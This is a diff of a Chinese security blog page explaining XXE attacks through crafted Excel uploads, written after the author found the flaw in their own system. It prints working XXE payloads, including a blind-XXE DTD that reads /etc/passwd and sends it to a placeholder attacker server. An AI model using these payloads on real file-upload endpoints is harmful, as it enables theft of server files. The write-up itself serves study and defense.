@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>利用EXCEL文件进行XXE文件攻击 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -112,51 +122,57 @@
       <div class="container">
         <div class="section">
           <div class="post_content">
-              <h3 id="利用EXCEL文件进行XXE文件攻击"><a href="#利用EXCEL文件进行XXE文件攻击" class="headerlink" title="利用EXCEL文件进行XXE文件攻击"></a>利用EXCEL文件进行XXE文件攻击</h3><p>此问题的来源是：<a href="https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg</a></p>
+              <h3 id="利用EXCEL文件进行XXE文件攻击"><a href="#利用EXCEL文件进行XXE文件攻击" class="headerlink" title="利用EXCEL文件进行XXE文件攻击"></a>利用EXCEL文件进行XXE文件攻击</h3><p>此问题的来源是：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg">https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg</a></p>
 <p>看到一篇如上的文章，利用EXCEL文档来造成系统的XXE漏洞，而恰好在我们自己的系统上发现了如上的类似漏洞，特此做一个记录文档。</p>
-<h4 id="0x01-什么是XML外部实体"><a href="#0x01-什么是XML外部实体" class="headerlink" title="0x01.什么是XML外部实体"></a>0x01.什么是XML外部实体</h4><p>解释来源：<a href="https://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/126788.html</a></p>
+<h4 id="0x01-什么是XML外部实体"><a href="#0x01-什么是XML外部实体" class="headerlink" title="0x01.什么是XML外部实体"></a>0x01.什么是XML外部实体</h4><p>解释来源：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/126788.html">https://www.freebuf.com/articles/web/126788.html</a></p>
 <p>如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。 比如，下图就是一个用来描述一个职工的XML文档样本，其中的’name’,’salary’,’address’ 被称为XML的元素。</p>
-<p><a href="https://image.3001.net/2017/02/21cd690cb4746d7146c5ef9f951d5746.jpg" target="_blank" rel="noopener"><img src="https://image.3001.net/2017/02/21cd690cb4746d7146c5ef9f951d5746.jpg" alt="Image"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/2017/02/21cd690cb4746d7146c5ef9f951d5746.jpg"><img src="https://image.3001.net/2017/02/21cd690cb4746d7146c5ef9f951d5746.jpg" alt="Image"></a></p>
 <p>有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。</p>
-<p><a href="https://image.3001.net/2017/02/b420129eeae40a064355b2e8329d7393.jpg" target="_blank" rel="noopener"><img src="https://image.3001.net/2017/02/b420129eeae40a064355b2e8329d7393.jpg" alt="Image"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/2017/02/b420129eeae40a064355b2e8329d7393.jpg"><img src="https://image.3001.net/2017/02/b420129eeae40a064355b2e8329d7393.jpg" alt="Image"></a></p>
 <p>在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。</p>
 <h4 id="0×02-什么是XML外部实体攻击？"><a href="#0×02-什么是XML外部实体攻击？" class="headerlink" title="0×02. 什么是XML外部实体攻击？"></a>0×02. 什么是XML外部实体攻击？</h4><p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。</p>
-<p><a href="https://image.3001.net/2017/02/f8743d6009c3adc3b15c06970df03b80.jpg" target="_blank" rel="noopener"><img src="https://image.3001.net/2017/02/f8743d6009c3adc3b15c06970df03b80.jpg" alt="Image"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/2017/02/f8743d6009c3adc3b15c06970df03b80.jpg"><img src="https://image.3001.net/2017/02/f8743d6009c3adc3b15c06970df03b80.jpg" alt="Image"></a></p>
 <h4 id="0×03-怎么甄别一个XML实体攻击漏洞？"><a href="#0×03-怎么甄别一个XML实体攻击漏洞？" class="headerlink" title="0×03. 怎么甄别一个XML实体攻击漏洞？"></a>0×03. 怎么甄别一个XML实体攻击漏洞？</h4><p>最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。</p>
 <h3 id="如何利用EXCEL文档来造成XXE漏洞"><a href="#如何利用EXCEL文档来造成XXE漏洞" class="headerlink" title="如何利用EXCEL文档来造成XXE漏洞"></a>如何利用EXCEL文档来造成XXE漏洞</h3><p>根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl/workbook.xml文件，来造成XXE漏洞。</p>
 <p>但根据利用情况的不同，还有可以替换的文件: _rels/.rels 和 xl/worksheets/sheet1.xml等文件。</p>
 <p>因此我们自己的系统在文件上传处，也存在一块，类似的XXE利用。</p>
-<p><img src="\2019\01\利用EXCEL文件进行XXE文件攻击\2233.png" alt="2233"></p>
+<p><img src="%5C2019%5C01%5C%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%5C2233.png" alt="2233"></p>
 <p>例如此处文件上传处，上传EXCEL文件。</p>
 <p>在文件中的[Content-Types].xml中写入测试POC：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://xxx.com/&quot; &gt;]&gt;
-&lt;name&gt;&amp;GVI;&lt;/name&gt;
-</code></pre><p>于是便可以在我们自己的VPS上监听到来自服务器的请求了。</p>
-<p><img src="\2019\01\利用EXCEL文件进行XXE文件攻击\44.png" alt="44"></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxx.com&#x2F;&quot; &gt;]&gt;
+&lt;name&gt;&amp;GVI;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>于是便可以在我们自己的VPS上监听到来自服务器的请求了。</p>
+<p><img src="%5C2019%5C01%5C%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%5C44.png" alt="44"></p>
 <p>由于是Blind XXE，所以我们利用在我们自己的VPS上存入如下文件：</p>
-<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http://ATTACKESERVER.com/?%file;&#39;&gt;&quot;&gt;
-%all;
-</code></pre><p>远程利用类似如下：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERSERVER.com/xxe_file.dtd&quot;&gt;
-</code></pre><p>这时候便可以在监听上收到远程文件的读取。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http:&#x2F;&#x2F;ATTACKESERVER.com&#x2F;?%file;&#39;&gt;&quot;&gt;
+%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>远程利用类似如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;ATTACKERSERVER.com&#x2F;xxe_file.dtd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这时候便可以在监听上收到远程文件的读取。</p>
 <p>当然这一块还可以尝试利用已有的脚本，来自动的开启web监听和ftp来传输文件。</p>
-<pre><code>https://github.com/joernchen/xxeserve
-</code></pre><p>其他文章介绍：</p>
-<p>1.<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
-<p>2.<a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">利用OOB XXE盲攻击获取文件系统访问权限</a></p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;joernchen&#x2F;xxeserve<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>其他文章介绍：</p>
+<p>1.<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
+<p>2.<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2249">利用OOB XXE盲攻击获取文件系统访问权限</a></p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2019/01/利用EXCEL文件进行XXE文件攻击/">/2019/01/利用EXCEL文件进行XXE文件攻击/</a>
-                    <p>发表日期：<a href="/2019/01/利用EXCEL文件进行XXE文件攻击/">January 31st 2019, 11:38:27 am</a>
-                    <p>更新日期：<a href="/2019/01/利用EXCEL文件进行XXE文件攻击/">January 31st 2019, 11:40:41 am</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/">https://misakikata.github.io/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/">January 31st 2019, 11:38:27 am</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/">January 31st 2019, 11:40:41 am</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -194,7 +210,7 @@
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2019/01/利用EXCEL文件进行XXE文件攻击/'; 
+            this.page.url = 'https://misakikata.github.io/2019/01/利用EXCEL文件进行XXE文件攻击/'; 
             this.page.identifier = '/2019/01/利用EXCEL文件进行XXE文件攻击/';
         };
         (function() { 
@@ -205,7 +221,7 @@
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -225,16 +241,32 @@
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
